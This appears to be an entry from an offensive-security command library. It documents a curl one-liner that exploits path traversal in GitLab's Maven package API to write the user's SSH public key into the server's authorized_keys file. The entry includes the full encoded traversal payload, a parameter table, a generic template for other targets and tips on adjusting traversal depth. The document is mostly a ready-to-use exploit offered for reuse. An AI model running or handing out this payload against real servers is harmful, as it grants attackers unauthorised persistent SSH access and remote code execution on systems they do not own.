---
data: >-
  curl -H "Private-Token: $(cat token)"
  http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys
  -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
tags:
  - path-traversal
  - upload
type: command
output: null
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:27.981Z'
id: bb2bc1ee-93d1-4914-b460-cdc02e638b41
verified: false
validated: true
submitted: true
---
# curl-gitlab-package-upload

## Command

```bash
curl -H "Private-Token: $(cat token)" http://10.26.0.5/api/v4/projects/2/packages/maven/a%2fb%2fc%2fd%2fe%2ff%2fg%2fh%2fi%2f1/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @/home/asakawa/.ssh/id_rsa.pub
```

## Description

This command exploits path traversal in GitLab's Maven package API by sending an authenticated PUT request to upload an SSH public key to an arbitrary server location, enabling RCE.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Private-Token: $(cat token)"` | Authentication header reading token from 'token' file | Yes |
| `http://10.26.0.5/api/v4/projects/2/packages/maven/...` | API endpoint with traversal payload in path | Yes |
| `-XPUT` | Use HTTP PUT method for upload | Yes |
| `--path-as-is` | Prevent curl from decoding % encodings in path | Yes |
| `--data-binary @/home/asakawa/.ssh/id_rsa.pub` | Upload binary content of public key file | Yes |

## Examples

### Basic Usage

```bash
curl -H "Private-Token: tokenvalue" http://target/api/v4/projects/1/packages/maven/traversal/%2e%2e%2f.ssh%2fauthorized_keys -XPUT --path-as-is --data-binary @id_rsa.pub
```

### Advanced Usage

Adjust project ID, IP, and traversal depth as needed for deeper directory navigation.

## Expected Output

HTTP response with status 200 or 201, body indicating successful package creation (file write confirmed server-side).

## Related

- [[commands/ssh-gitlab-access]]
- [[procedures/Exploit-Path-Traversal-to-Inject-SSH-Key]]
